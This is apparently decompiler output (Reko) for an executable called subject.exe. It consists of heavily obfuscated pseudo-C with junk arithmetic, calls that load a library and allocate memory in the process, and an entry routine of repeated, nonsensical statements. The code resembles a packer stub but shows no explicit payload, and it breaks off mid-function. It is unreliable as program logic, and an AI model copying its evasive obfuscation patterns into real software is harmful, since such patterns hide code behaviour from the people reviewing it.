// subject.c
// Generated by decompiling subject.exe
// using Reko decompiler version VERSION

#include "subject.h"

// 00411B71: Register uint32 fn00411B71(Register uint32 ecx, Register ui32 edx, Register out ptr32 edxOut)
uint32 fn00411B71(uint32 ecx, ui32 edx, ptr32 & edxOut)
{
	GetCommandLineA();
	uint32 eax_73 = 0x01 - edx + 0xC4 & dwLoc54;
	word32 edx_82;
	*edxOut = (word32) (SEQ(dwLoc016C, dwLoc8C + eax_73) + SEQ(dwLoc029C, eax_73));
	return 0x0A87;
}

// 00411DB0: Register ui32 fn00411DB0(Register ui32 ecx, Register (ptr word32) esi, Register ui32 edi, Register out ptr32 edxOut, Register out ptr32 ebxOut, Register out ptr32 esiOut, Register out ptr32 ediOut)
ui32 fn00411DB0(ui32 ecx, word32 * esi, ui32 edi, ptr32 & edxOut, ptr32 & ebxOut, ptr32 & esiOut, ptr32 & ediOut)
{
	GetCursor();
	GetOEMCP();
	ui32 edx_31 = (byte) ((dwLoc01C0 ^ 0x00) + dwLoc01FC < 0x00) + (dwLocD4 + 0x034E) ^ dwLoc0138;
	uint32 ecx_87 = ((dwLoc0214 & 0x00 & dwLoc01B4) + 0x01 | edx_31) - edx_31 + edx_31;
	if (dwLoc0134 < ecx_87)
		dwLoc0120 = dwLoc0120 ^ ecx_87;
	Eq_66 eax_105 = LoadLibraryA(&globals->t40406D);
	if (eax_105 == 0x00)
		ExitProcess(0x00);
	ui32 v30_190 = dwLoc0130 & dwLoc84;
	Eq_66 dwLoc0280_240 = eax_105;
	do
	{
		memmove(fp - 44, dwLoc0280_240, 0x04);
		uint32 esi_272 = (edi | 181 | edi) - 0x1E00 ^ edi;
		dwLoc0280_240 = dwLoc0280_240 + 0x01;
		Eq_100 C_1837 = cond(esi_272);
		if (esi_272 <= 0x00)
		{
			dwLoc023C = dwLoc023C | 3770;
			edi = esi_272 + 4794;
			C_1837.u0 = false;
		}
		edi = (ui32) ((byte) C_1837 + (edi + dwLoc0198));
	} while (dwLoc2C != 0x33FFFFFF);
	ui32 edx_1817 = dwLoc01F8 - 0x1C01;
	if (dwLoc01F8 < 7989)
	{
		word32 eax_1800 = (dwLoc01F8 - 0x1C01 ^ 0x66) + 0x13 + v30_190;
		dwLoc0250 = dwLoc0250 + 0x01;
		dwLoc0190 = dwLoc0190 + eax_1800;
		edx_1817 = dwLoc01F8 - 0x1C01 ^ eax_1800 ^ eax_1800;
	}
	uint32 eax_341 = dwLoc0190 ^ 3755;
	ui32 eax_354 = eax_341 + 0x0100 + (((edx_1817 - dwLoc01B8) - dwLoc0174) - (eax_341 < 0x0100));
	Eq_7 eax_338 = GetCommandLineA();
	VirtualAllocEx((void *) ~0x00, 0x00, 0x0600, dwLoc0170, dwLocAC);
	uint32 edx_1764 = eax_354 + 0x0340 & eax_354 + 0x0300;
	uint32 ecx_400 = dwLoc0100 + edx_1764;
	uint32 ecx_1785 = (word32) (SEQ(ecx_400 + 0x01, ecx_400 + 0x01) + SEQ(dwLoc60, edx_1764)) ^ dwLocCC ^ edx_1764;
	word32 v63_412 = dwLoc0178 + edx_1764;
	if (ecx_1785 >= 0x00)
	{
		edx_1764 = ecx_1785 + 232 | dwLoc0110;
		ecx_1785 = (ecx_1785 - 0xCB | dwLoc01C4) - dwLoc01E0;
	}
	GetCursor();
	word32 edx_454;
	fn00411B71(ecx_1785, edx_1764 ^ dwLoc01F4 | dwLocCC, out edx_454);
	ui32 edx_469 = dwLoc01F8 & 0x00 ^ dwLoc026C;
	uint32 ecx_497 = (dwLoc023C ^ 0xA5) + dwLoc0180 ^ GetOEMCP();
	uint32 ecx_515 = v63_412 + dwLoc018C ^ dwLoc0250;
	word32 edx_1733 = edx_469 + 0x19;
	if (ecx_515 + 0x01 > dwLoc01E4)
	{
		dwLoc010C = dwLoc010C & ecx_515 + 0x01;
		edx_1733 = dwLoc023C + 0xE0 + dwLoc0120;
	}
	uint32 v82_552 = dwLoc0108 - edx_1733;
	Eq_35 eax_556 = GetOEMCP();
	if (0x00 - esi_272 + esi_272 < 0x01)
		dwLoc01D0 = v86;
	word32 eax_593;
	word32 edx_594;
	fn00412F4E(eax_556, out eax_593, out edx_594);
	Eq_290 eax_667 = IsChild(0xE7, dwLoc0188);
	if ((eax_667 & 0x00) != dwLoc01F8 - 0x01)
		dwLoc01D0 = dwLoc01D0 - (eax_667 | dwLoc0254);
	word32 eax_733;
	word32 edx_734;
	fn00412F4E(GetCursor(), out eax_733, out edx_734);
	ui32 esi_715 = (0xE7 - dwLocE8 & 0x0246) + 0x01;
	ui32 edi_718 = dwLoc010C & esi_715 - 0x01;
	Eq_85 v113_722 = dwLoc01F8 - 0x01 + (esi_715 - 0x01);
	IsChild(dwLoc58, v113_722);
	ui32 ecx_776;
	fn00416E0A(v113_722, out ecx_776);
	GetVersionExA(fp - 0x0270);
	word32 edx_837 = eax_338 - (dwLocA0 & 0x00) + (dwLoc0214 - 0x01);
	Eq_85 ecx_1553 = dwLoc0214 - (CHAR *) 0x01;
	Eq_164 v137_822 = dwLoc01D0 - 0x01;
	Eq_379 edx_845 = (word32) (SEQ(dwLoc01CC, edx_837) - SEQ(edx_837, dwLocA0 & 0x00)) | dwLoc0214 - (CHAR *) 0x01;
	if (edx_845 == 0xFA)
		ecx_1553 = edx_845 + dwLoc60 + (edx_845 <u 0xFA) + 0x4B;
	GetVersionExA(fp - 0x0104);
	word32 ecx_885;
	fn00416E0A(ecx_1553, out ecx_885);
	word32 ebx_927;
	word32 esi_928;
	ui32 edi_929;
	fn0041899F(VirtualAllocEx((void *) ~0x00, 0x00, 0x0400, dwLoc94, v137_822), edi_718, out ebx_927, out esi_928, out edi_929);
	*(fp - 0x0264) = *(fp - 0x0264) + 0xFD;
	ui32 eax_943 = *(fp - 0x0144) ^ 0xFD;
	*(fp - 0x0204) = *(fp - 0x0204) + eax_943;
	*(fp - 0x88) = eax_943;
	*(fp - 664) = 0x00;
	Eq_66 eax_1506 = GetModuleHandleA(*(fp - 664));
	uint32 edx_1511 = (*(fp - 252) | 0x0B26) + *(fp - 0x0110) ^ eax_1506;
	*(fp - 0x0110) = *(fp - 0x0110) | edx_1511;
	*(fp - 600) = *(fp - 600) & edx_1511;
	*(fp - 0x0208) = edx_1511;
	if (*(fp - 344) <= edx_1511)
	{
		ui32 eax_1500 = *(fp - 0x0234);
		*(fp - 0x0154) = *(fp - 0x0154) ^ eax_1500;
		eax_1506 = eax_1500 - (edx_1511 - 0x018E) - 0x01 & edx_1511 - 0x018E;
		edx_1511 = edx_1511 - 399 ^ eax_1506;
	}
	ui32 ecx_983 = *(fp - 332);
	uint32 ecx_994 = (ecx_983 - *(fp - 0x5C) - ((((word32) eax_1506 + edx_1511) + ecx_983 & *(fp - 88)) - *(fp - 0x0224) < 0x00) ^ *(fp - 0x01F8)) + *(fp - 0x01B0) - *(fp - 0x88);
	word32 edx_993 = *(fp - 0x013C);
	ui32 ecx_998 = ecx_994 - *(fp - 600) - (ecx_994 < 0x00) & *(fp - 0x026C);
	ui32 eax_1003 = 0xCE - *(fp - 0x0110) - *(fp - 0xEC);
	*(fp - 0xA0) = *(fp - 0xA0) + edi_929;
	*(fp - 0xB0) = *(fp - 0xB0) & edi_929;
	*(fp - 0x0130) = eax_1003;
	*(fp - 332) = *(fp - 332) & eax_1003;
	*(fp - 336) = *(fp - 336) + 0x01;
	*(fp - 220) = *(fp - 220) + eax_1003;
	*(fp - 664) = *(fp - 0x011C);
	word32 edx_1024;
	word32 ecx_1025 = fn00411B71(ecx_998 + 0x01, edx_993 - 0x01, out edx_1024);
	word32 edx_1029 = (*(fp - 244) ^ 177 ^ ecx_1025) + ecx_1025;
	*(fp - 0x0234) = *(fp - 0x0234) ^ edx_1029;
	ui32 ecx_1038 = ecx_1025 - 0x6C;
	if (edx_1029 != 0x00)
	{
		*(fp - 0x019C) = *(fp - 0x019C) + 0x01;
		*(fp - 0x0108) = *(fp - 0x0108) - 0x01;
		*(fp - 0x011C) = 0x00;
		ecx_1038 = 0x00;
		if (edx_1029 != 0x00)
			ecx_1038 = *(fp - 252) ^ 0x00;
	}
	GetOEMCP();
	uint32 edx_1055 = (ecx_1038 & 0x00 ^ 0x0B00) - 0x0E00;
	ui32 edx_1058 = edx_1055 - *(fp - 0x022C) - (edx_1055 < 0x00);
	*(fp - 616) = edx_1058;
	*(fp - 0x6C) = *(fp - 0x6C) ^ edx_1058;
	word32 edx_1066 = (edx_1058 & *(fp - 0x0180)) + *(fp - 0xB0);
	*(fp - 0x80) = *(fp - 0x80);
	*(fp - 0xE0) = *(fp - 0xE0) & 0x00;
	*(fp - 388) = edx_1066;
	uint32 ecx_1072 = 0x00 - edx_1066;
	*(fp - 0x9C) = (word32) ((byte) (ecx_1072 < 0x0D00) + (*(fp - 0x9C) + edx_1066));
	ui32 edi_1081 = (eax_1003 | 0x0BFF) & 0x00;
	*(fp - 0x0230) = *(fp - 0x0230) - (edi_1081 + 0x01);
	*(fp - 0x68) = *(fp - 0x68) | edi_1081 + 0x01;
	*(fp - 0x0138) = edi_1081 + 0x01;
	uint32 edx_1090 = *(fp - 0x023C);
	*(fp - 0xB4) = (word32) ((byte) (edx_1090 < 0x00) + (*(fp - 0xB4) + 4000));
	*(fp - 0x020C) = *(fp - 0x020C) ^ 4000;
	*(fp - 0x01F8) = *(fp - 0x01F8) + 4000;
	*(fp - 0x0214) = *(fp - 0x0214) + (edx_1090 & 4000);
	ui32 edi_1104 = edx_1090 & 4000 & *(fp - 0x01E0);
	*(fp - 0xC4) = *(fp - 0xC4) + 0x01;
	*(fp - 0x0108) = *(fp - 0x0108) - 0x01;
	*(fp - 668) = edx_1090;
	*(fp - 0x02A0) = *(fp - 0xD0);
	*(fp - 676) = edi_1104;
	*(fp - 0x02A8) = *(fp - 0x01D4);
	ui32 ecx_1121;
	fn00416E0A(ecx_1072 - 0x0D00, out ecx_1121);
	uint32 edx_1127 = *(fp - 0xB0) - *(fp - 0x0168);
	*(fp - 220) = *(fp - 220) ^ edx_1127 + 0x01;
	uint32 v181_1132 = *(fp - 0x01DC) + (edx_1127 + 0x01);
	*(fp - 0x01DC) = v181_1132;
	*(fp - 0x88) = (word32) ((byte) (v181_1132 < 0x00) + (*(fp - 0x88) + (edx_1127 + 0x01)));
	if (edx_1127 - 0x0ABD != *(fp - 0x01F8))
	{
		*(fp - 500) = 0x00;
		if (edx_1127 - 0x0ABD < *(fp - 0xF0))
		{
l004128B1:
			*(fp - 0x02AC) = 0x00;
			GetModuleHandleA(*(fp - 0x02AC));
			ui32 ecx_1163 = ecx_1121 + 0xFE & 0x01;
			uint32 eax_1167 = 0x01 - *(fp - 0x6C) - 0x01 + ecx_1163;
			*(fp - 244) = (word32) ((byte) (eax_1167 < 0x00) + (*(fp - 244) + eax_1167));
			*(fp - 232) = *(fp - 232) - eax_1167;
			uint32 ecx_1181 = ecx_1163 - 0xA2 + (eax_1167 + 0x01);
			word32 ecx_1185 = ecx_1181 + 0x2F - *(fp - 0x54) - (ecx_1181 < 0x2F);
			if (eax_1167 != ~0xA0)
			{
				*(fp - 0x01DC) = *(fp - 0x01DC) - ecx_1185;
				*(fp - 0x0228) = *(fp - 0x0228) + 0x01;
				*(fp - 488) = *(fp - 488);
				*(fp - 100) = *(fp - 100) & 0x00;
				ecx_1185 = 0x00;
			}
			ui32 ecx_1199;
			fn00416E0A(ecx_1185 + 0x1F, out ecx_1199);
			ui32 edx_1206 = (*(fp - 292) ^ 0x48) + *(fp - 0x0164) & ecx_1199 - 0x48;
			*(fp - 0x0128) = edx_1206;
			*(fp - 484) = *(fp - 484) | edx_1206;
			*(fp - 0x023C) = *(fp - 0x023C) - edx_1206;
			*(fp - 0x70) = *(fp - 0x70) ^ edx_1206;
			ui32 ecx_1202 = ecx_1199 - 0x48;
			if (edx_1206 == *(fp - 0xA8))
			{
				*(fp - 404) = *(fp - 404) + 0x01;
				*(fp - 0x0260) = *(fp - 0x0260) + 0x01;
				*(fp - 424) = *(fp - 424);
				*(fp - 0x01DC) = *(fp - 0x01DC);
				ui32 edx_1392 = edx_1206 ^ edx_1206 - 0x01;
				*(fp - 0x0230) = *(fp - 0x0230) + edx_1392;
				*(fp - 0x01C4) = *(fp - 0x01C4) + 0x01;
				*(fp - 0x023C) = *(fp - 0x023C) ^ edx_1392;
				*(fp - 0x0244) = *(fp - 0x0244) - edx_1392;
				ecx_1202 = edx_1206 + 0x56;
			}
			*(fp - 0x02AC) = *(fp - 0x013C);
			*(fp - 688) = *(fp - 0x0270);
			IsChild(*(fp - 688), *(fp - 0x02AC));
			*(fp - 0x70) = (word32) ((byte) ((*(fp - 600) + 0x18FF & *(fp - 0x0238)) < 0x0FD5) + (*(fp - 0x70) + 0x0FD5));
			*(fp - 0x021C) = *(fp - 0x021C) - 0x01;
			uint32 eax_1263 = *(fp - 0xA0) ^ *(fp - 0x0270);
			*(fp - 388) = *(fp - 388) - 0x01;
			ui32 ecx_1229 = ecx_1202 + 0x4E;
			if (eax_1263 >= 6656)
			{
				*(fp - 0x88) = *(fp - 0x88) & 0x00;
				*(fp - 0x0230) = 0x00;
				if (eax_1263 != 3364)
				{
l00412A34:
					word32 edx_1298;
					word32 edi_1299;
					ui32 eax_1300 = fn0041736A(ecx_1229, out edx_1298, out edi_1299);
					*(fp - 0x01B4) = *(fp - 0x01B4) - 0x01;
					word32 ecx_1303 = (eax_1300 | 232) + eax_1300;
					*(fp - 0x0224) = *(fp - 0x0224) + ecx_1303;
					word32 eax_1309 = *(fp - 0x0204);
					return ecx_1303 - eax_1309 + 0x01 ^ eax_1309;
				}
			}
			goto l00412A34;
		}
		*(fp - 444) = *(fp - 444) | edx_1127 - 0x0ABD;
		uint32 v184_1455 = *(fp - 0x0270) - (edx_1127 - 0x0ABD);
		*(fp - 0x0270) = v184_1455;
		uint32 v185_1459 = (byte) (v184_1455 < 0x00) + (*(fp - 0x8C) + (edx_1127 - 0x0ABD));
		*(fp - 0x8C) = v185_1459;
		*(fp - 0x01F0) = *(fp - 0x01F0) - (edx_1127 - 0x0ABD) - (v185_1459 < 0x00);
		*(fp - 0x6C) = *(fp - 0x6C) + 0x01;
	}
	goto l004128B1;
}

// 00412F4E: FlagGroup byte fn00412F4E(Register Eq_35 eax, Register out ptr32 eaxOut, Register out ptr32 edxOut)
byte fn00412F4E(Eq_35 eax, ptr32 & eaxOut, ptr32 & edxOut)
{
	uint32 edx_142 = (0x00 - dwLoc013C | eax) - 212 + dwLoc90 - dwLoc0284;
	if (edx_142 >= 0x0FD5)
		edx_142 = edx_142 + 0xC2;
	VirtualAllocEx((void *) ~0x00, 0x00, 0x0600, dwLoc020C, dwLoc028C);
	uint32 edx_35 = edx_142 - dwLoc0138;
	uint32 edx_71 = edx_35 + dwLocE0;
	uint32 eax_68 = (dwLoc9C - 0x01 & dwLoc018C) - dwLoc34 & edx_35;
	*eaxOut = eax_68;
	uint32 edx_117 = edx_71 + 0x01;
	Eq_1673 C_127 = cond(eax_68);
	if (eax_68 > 0x00)
	{
		uint32 eax_104 = eax_68 - 0x01 - (edx_71 + 0x01);
		edx_117 = eax_104 - 0x36 - dwLoc027C;
		ui32 eax_124 = ((eax_104 ^ edx_117) + 0x0E00 & edx_117) - edx_117;
		*eaxOut = eax_124;
		C_127 = cond(eax_124);
	}
	word32 edx_93 = (((word32) C_127 + ((word32) dwLoc020C + edx_117) | dwLoc01C8) & dwLoc0100) + dwLoc016C;
	*edxOut = edx_93;
	return cond(edx_93);
}

// 0041324C: Register Eq_164 Win32CrtStartup()
DWORD Win32CrtStartup()
{
	GetModuleHandleA(null);
	byte cl_13;
	byte ch_14;
	byte * edx_15;
	ptr32 ebx_16;
	word32 ebp_17;
	struct Eq_1716 * esi_18;
	word32 edi_19;
	byte * eax_20 = fn0041560A(ecx, fp - 0x04, out cl_13, out ch_14, out edx_15, out ebx_16, out ebp_17, out esi_18, out edi_19);
	byte al_21 = (byte) eax_20;
	*eax_20 = *eax_20 + al_21;
	*eax_20 = *eax_20 + al_21;
	*eax_20 = *eax_20 + al_21;
	*eax_20 = *eax_20 + al_21;
	*eax_20 = *eax_20 + al_21;
	*eax_20 = *eax_20 + al_21;
	*eax_20 = *eax_20 + al_21;
	*eax_20 = *eax_20 + al_21;
	*eax_20 = *eax_20 + al_21;
	*eax_20 = *eax_20 + al_21;
	*eax_20 = *eax_20 + al_21;
	*eax_20 = *eax_20 + al_21;
	*eax_20 = *eax_20 + al_21;
	*eax_20 = *eax_20 + al_21;
	*eax_20 = *eax_20 + al_21;
	*eax_20 = *eax_20 + al_21;
	*eax_20 = *eax_20 + al_21;
	*eax_20 = *eax_20 + al_21;
	*eax_20 = *eax_20 + al_21;
	*eax_20 = *eax_20 + al_21;
	*eax_20 = *eax_20 + al_21;
	*eax_20 = *eax_20 + al_21;
	*eax_20 = *eax_20 + al_21;
	*eax_20 = *eax_20 + al_21;
	*eax_20 = *eax_20 + al_21;
	*eax_20 = *eax_20 + al_21;
	*eax_20 = *eax_20 + al_21;
	*eax_20 = *eax_20 + al_21;
	*eax_20 = *eax_20 + al_21;
	*eax_20 = *eax_20 + al_21;
	*eax_20 = *eax_20 + al_21;
	*eax_20 = *eax_20 + al_21;
	*eax_20 = *eax_20 + al_21;
	*eax_20 = *eax_20 + al_21;
	*eax_20 = *eax_20 + al_21;
	*eax_20 = *eax_20 + al_21;
	*eax_20 = *eax_20 + al_21;
	*eax_20 = *eax_20 + al_21;
	*eax_20 = *eax_20 + al_21;
	*eax_20 = *eax_20 + al_21;
	*eax_20 = *eax_20 + al_21;
	*eax_20 = *eax_20 + al_21;
	*eax_20 = *eax_20 + al_21;
	*eax_20 = *eax_20 + al_21;
	*eax_20 = *eax_20 + al_21;
	*eax_20 = *eax_20 + al_21;
	*eax_20 = *eax_20 + al_21;
	*eax_20 = *eax_20 + al_21;
	*eax_20 = *eax_20 + al_21;
	*eax_20 = *eax_20 + al_21;
	*eax_20 = *eax_20 + al_21;
	*eax_20 = *eax_20 + al_21;
	*eax_20 = *eax_20 + al_21;
	*eax_20 = *eax_20 + al_21;
	*eax_20 = *eax_20 + al_21;
	*eax_20 = *eax_20 + al_21;
	*eax_20 = *eax_20 + al_21;
	*eax_20 = *eax_20 + al_21;
	*eax_20 = *eax_20 + al_21;
	*eax_20 = *eax_20 + al_21;
	*eax_20 = *eax_20 + al_21;
	*eax_20 = *eax_20 + al_21;
	*eax_20 = *eax_20 + al_21;
	*eax_20 = *eax_20 + al_21;
	*eax_20 = *eax_20 + al_21;
	*eax_20 = *eax_20 + al_21;
	*eax_20 = *eax_20 + al_21;
	*eax_20 = *eax_20 + al_21;
	*eax_20 = *eax_20 + al_21;
	*eax_20 = *eax_20 + al_21;
	*eax_20 = *eax_20 + al_21;
	*eax_20 = *eax_20 + al_21;
	*eax_20 = *eax_20 + al_21;
	*eax_20 = *eax_20 + al_21;
	*eax_20 = *eax_20 + al_21;
	*eax_20 = *eax_20 + al_21;
	*eax_20 = *eax_20 + al_21;
	*eax_20 = *eax_20 + al_21;
	*eax_20 = *eax_20 + al_21;
	*eax_20 = *eax_20 + al_21;
	*eax_20 = *eax_20 + al_21;
	*eax_20 = *eax_20 + al_21;
	*eax_20 = *eax_20 + al_21;
	*eax_20 = *eax_20 + al_21;
	*eax_20 = *eax_20 + al_21;
	*eax_20 = *eax_20 + al_21;
	*eax_20 = *eax_20 + al_21;
	*eax_20 = *eax_20 + al_21;
	*eax_20 = *eax_20 + al_21;
	*eax_20 = *eax_20 + al_21;
	*eax_20 = *eax_20 + al_21;
	*eax_20 = *eax_20 + al_21;
	*eax_20 = *eax_20 + al_21;
	*eax_20 = *eax_20 + al_21;
	*eax_20 = *eax_20 + al_21;
	*eax_20 = *eax_20 + al_21;
	*eax_20 = *eax_20 + al_21;
	*eax_20 = *eax_20 + al_21;
	*eax_20 = *eax_20 + al_21;
	*eax_20 = *eax_20 + al_21;
	*eax_20 = *eax_20 + al_21;
	*eax_20 = *eax_20 + al_21;
	*eax_20 = *eax_20 + al_21;
	*eax_20 = *eax_20 + al_21;
	*eax_20 = *eax_20 + al_21;
	*eax_20 = *eax_20 + al_21;
	*eax_20 = *eax_20 + al_21;
	*eax_20 = *eax_20 + al_21;
	cu8 * eax_242 = esi_18->ptr0000;
	byte al_243 = (byte) eax_242;
	*eax_242 = *eax_242 + al_243;
	null[eax_242].b0000 = null[eax_242].b0000 + al_243;
	*eax_242 = *eax_242 + al_243;
	*eax_242 = *eax_242 + al_243;
	byte cl_236 = cl_13 + SLICE(eax_20, byte, 8);
	byte * ecx_237 = DPB(ecx, cl_236, 0);
	*ecx_237 = *ecx_237 + ch_14;
	byte al_259;
	byte ah_260;
	__aas(al_243, SLICE(eax_242, byte, 8), &al_259, &ah_260);
	*eax_242 = *eax_242 + al_259;
	__outdw(edx_15, eax_242);
	*eax_242 = *eax_242 + al_259;
	*eax_242 = *eax_242 + al_259;
	*eax_242 = *eax_242 + al_259;
	*eax_242 = *eax_242 + al_259;
	cu8 v136_277 = *eax_242 + al_259;
	*eax_242 = v136_277;
	byte bh_270 = SLICE(ebx_16 - 0x01, byte, 8);
	*eax_242 = *eax_242 + al_259;
	*eax_242 = *eax_242 + al_259;
	*eax_242 = *eax_242 + al_259;
	esi_18->b140C = esi_18->b140C + ah_260;
	*eax_242 = *eax_242 + al_259;
	*eax_242 = *eax_242 + al_259;
	byte ah_293 = ah_260 + al_259;
	cu8 * eax_294 = DPB(eax_242, ah_293, 8);
	*eax_294 = *eax_294 + al_259;
	*eax_294 = *eax_294 + al_259;
	*eax_294 = *eax_294 + al_259;
	byte * edi_303 = *(fp - 0x62);
	*eax_294 = *eax_294 + al_259;
	*eax_294 = *eax_294 + al_259;
	*eax_294 = *eax_294 + al_259;
	*eax_294 = *eax_294 + al_259;
	*(ebx_16 - 0x01) = *(ebx_16 - 0x01) + ch_14;
	*eax_294 = *eax_294 + al_259;
	*eax_294 = *eax_294 + al_259;
	byte ch_317 = ch_14 + cl_236;
	byte * ecx_318 = DPB(ecx_237, ch_317, 8);
	Mem322[ecx_318 + eax_294:byte] = Mem320[ecx_318 + eax_294:byte] + bh_270;
	*eax_294 = *eax_294 + al_259;
	*eax_294 = *eax_294 + al_259;
	*eax_294 = *eax_294 + al_259;
	*eax_294 = *eax_294 + al_259;
	*eax_294 = *eax_294 + al_259;
	*eax_294 = *eax_294 + cl_236;
	*eax_294 = *eax_294 + al_259;
	cu8 v164_337 = *eax_294 + al_259;
	*eax_294 = v164_337;
	*edi_303 = *edi_303 + ch_317;
	*(fp - 0x62) = (byte **) edx_15;
	__lock();
	byte al_341 = al_259 + (v164_337 < 0x00);
	__outb(0x1C, al_341);
	DWORD eax_342 = DPB(eax_294, al_341, 0);
	*eax_342 = (Eq_164) ((word32) *eax_342 + al_341);
	esi_18->b000C = esi_18->b000C + cl_236;
	*eax_342 = (Eq_164) ((word32) *eax_342 + al_341);
	esi_18->b000C = esi_18->b000C + dh;
	*eax_342 = (Eq_164) ((word32) *eax_342 + al_341);
	*edx_15 = *edx_15 + ch_317;
	*eax_342 = (Eq_164) ((word32) *eax_342 + al_341);
	*eax_342 = (Eq_164) ((word32) *eax_342 + al_341);
	*eax_342 = (Eq_164) ((word32) *eax_342 + al_341);
	*(fp - 0x66) = ~0x37;
	*eax_342 = (Eq_164) ((word32) *eax_342 + al_341);
	*eax_342 = (Eq_164) ((word32) *eax_342 + al_341);
	esi_18->b91F6000C = esi_18->b91F6000C + ah_293;
	*eax_342 = (Eq_164) ((word32) *eax_342 + al_341);
	*eax_342 = (Eq_164) ((word32) *eax_342 + al_341);
	cu8 v182_383 = (word32) *eax_342 + al_341;
	*eax_342 = (Eq_164) v182_383;
	if (v182_383 <= 0x00)
	{
		*eax_342 = (Eq_164) ((word32) *eax_342 + al_341);
		*eax_342 = (Eq_164) ((word32) *eax_342 + al_341);
		__outb(edx_15, al_341);
		*eax_342 = (Eq_164) ((word32) *eax_342 + al_341);
		*eax_342 = (Eq_164) ((word32) *eax_342 + al_341);
		esi_18->b000D = esi_18->b000D + dl;
		*eax_342 = (Eq_164) ((word32) *eax_342 + al_341);
		*eax_342 = (Eq_164) ((word32) *eax_342 + al_341);
	}
	*edx_15 = *edx_15 + dl;
	*eax_342 = (Eq_164) ((word32) *eax_342 + al_341);
	*eax_342 = (Eq_164) ((word32) *eax_342 + al_341);
	*eax_342 = (Eq_164) ((word32) *eax_342 + al_341);
	*eax_342 = (Eq_164) ((word32) *eax_342 + al_341);
	return eax_342;
}

// 0041560A: Register word32 fn0041560A(Register word32 ecx, Register ptr32 ebp, Register out Eq_1723 clOut, Register out Eq_1724 chOut, Register out ptr32 edxOut, Register out ptr32 ebxOut, Register out ptr32 ebpOut, Register out ptr32 esiOut, Register out ptr32 ediOut)
word32 fn0041560A(word32 ecx, ptr32 ebp, Eq_1723 & clOut, Eq_1724 & chOut, ptr32 & edxOut, ptr32 & ebxOut, ptr32 & ebpOut, ptr32 & esiOut, ptr32 & ediOut)
{
	uint32 eax_20 = 1700 - *(ebp - 88) + ecx;
	*(ebp - 0x54) = *(ebp - 0x54) - 0x01;
	if (*(ebp - 88) <= eax_20)
	{
		*(ebp - 0x54) = 0x04;
		*(ebp - 0x50) = *(ebp - 0x50) - 0x01;
		*(ebp - 0x54) = *(ebp - 0x54) - 0x04 - (*(ebp - 88) < eax_20);
		eax_20 = (eax_20 & *(ebp - 88)) + *(ebp - 88);
	}
	ui32 eax_21 = eax_20 | *(ebp - 0x54);
	*(ebp - 0x50) = *(ebp - 0x50) & 0x00;
	if (eax_21 * 0x02 == 0x0FBF)
	{
		*(ebp - 0x50) = *(ebp - 0x50) - 0x01;
		*(ebp - 0x54) = eax_21 * 0x02;
		uint32 v17_2635 = (byte) (eax_21 * 0x02 < 0x0FBF) + (*(ebp - 0x54) + eax_21 * 0x02);
		*(ebp - 0x54) = v17_2635;
		*(ebp - 0x50) = (word32) ((byte) (v17_2635 < 0x00) + (*(ebp - 0x50) + eax_21 * 0x02));
		*(ebp - 0x50) = *(ebp - 0x50) + 0x01;
		ui32 eax_2643 = *(ebp - 0x50);
		*(ebp - 0x50) = *(ebp - 0x50) - 0x01;
		uint32 edx_2650 = eax_21 * 0x02 - (((eax_2643 + 0x01 | eax_21 * 0x02) ^ eax_21 * 0x02) & *(ebp - 0x50));
		*(ebp - 88) = (word32) ((byte) (edx_2650 < 0x00) + (*(ebp - 88) + edx_2650));
		*(ebp - 88) = *(ebp - 88) - edx_2650;
		*(ebp - 88) = *(ebp - 88) | edx_2650;
		*(ebp - 88) = *(ebp - 88) - edx_2650;
		*(ebp - 88) = *(ebp - 88) + edx_2650;
	}
	Eq_35 eax_43 = GetOEMCP();
	uint32 edx_46 = *(ebp - 88) + 889;
	*(ebp - 0x50) = edx_46;
	*(ebp - 0x54) = *(ebp - 0x54) - 0x01;
	*(ebp - 0x50) = (word32) ((byte) (edx_46 < 0x00) + (*(ebp - 0x50) + edx_46));
	ui32 edx_54 = edx_46 ^ eax_43;
	if (edx_54 == 0x0899)
	{
		*(ebp - 0x54) = *(ebp - 0x54) + 0x01;
		*(ebp - 0x54) = *(ebp - 0x54);
		*(ebp - 0x50) = *(ebp - 0x50) & 0x00;
		*(ebp - 88) = (edx_54 + 0x0900 & (0x00 - (edx_54 + 0x0900) ^ edx_54 + 0x0900) - *(ebp - 88)) - 0x01;
	}
	*(ebp - 0x54) = *(ebp - 0x54) + 0x20;
	*(ebp - 0x54) = *(ebp - 0x54) + 0x20;
	*(ebp - 0x54) = *(ebp - 0x54) - 0x01;
	*(ebp - 88) = *(ebp - 88) & 116;
	*(ebp - 0x50) = *(ebp - 0x50) | 116;
	*(ebp - 0x54) = *(ebp - 0x54) - 116;
	*(ebp - 0x50) = *(ebp - 0x50) ^ 0x20;
	*(ebp - 88) = *(ebp - 88) ^ 116;
	uint32 ecx_102 = (0x0EF5 - *(ebp - 0x50) & 116) + 0x01;
	*(ebp - 88) = *(ebp - 88) - 0x01;
	uint32 v40_106 = *(ebp - 88) - (ecx_102 - 0x01);
	*(ebp - 88) = v40_106;
	*(ebp - 88) = (word32) ((byte) (v40_106 < 0x00) + (*(ebp - 88) + (ecx_102 - 0x01)));
	uint32 eax_117 = 116;
	if (ecx_102 + 0xE7 < *(ebp - 0x50))
	{
		*(ebp - 0x54) = *(ebp - 0x54) - 0x01;
		*(ebp - 88) = *(ebp - 88);
		eax_117 = 0xCB - *(ebp - 0x50);
	}
	ui32 edx_121 = ((*(ebp - 0x54) ^ 0x00) & *(ebp - 0x54)) + eax_117;
	*(ebp - 0x54) = *(ebp - 0x54) | edx_121;
	uint32 edx_128 = edx_121 - ((eax_117 & edx_121) + 0x7B);
	if (edx_128 == 0x1D)
	{
		*(ebp - 0x50) = *(ebp - 0x50) + 0x01;
		if (*(ebp - 88) <= edx_128)
		{
l0041575D:
			uint32 ecx_141 = *(ebp - 0x54) & edx_128 | edx_128;
			*(ebp - 0x50) = *(ebp - 0x50) + ecx_141;
			*(ebp - 88) = *(ebp - 88) + 0x01;
			*(ebp - 88) = *(ebp - 88) + 0x01;
			if (ecx_141 <= 0xC5)
			{
				*(ebp - 0x54) = *(ebp - 0x54) - 0x01;
				edx_128 = 0x0276 - *(ebp - 0x54);
			}
			*(ebp - 0x50) = *(ebp - 0x50) + 110;
			*(ebp - 88) = *(ebp - 88) | 110;
			word32 edx_166 = edx_128 + 0x01;
			uint32 eax_171 = 110 - *(ebp - 88) & (edx_166 ^ 110);
			*(ebp - 0x54) = eax_171;
			*(ebp - 88) = eax_171;
			*(ebp - 0x50) = *(ebp - 0x50) ^ eax_171;
			*(ebp - 0x54) = *(ebp - 0x54) ^ eax_171;
			ui32 edx_167 = edx_166 ^ 110;
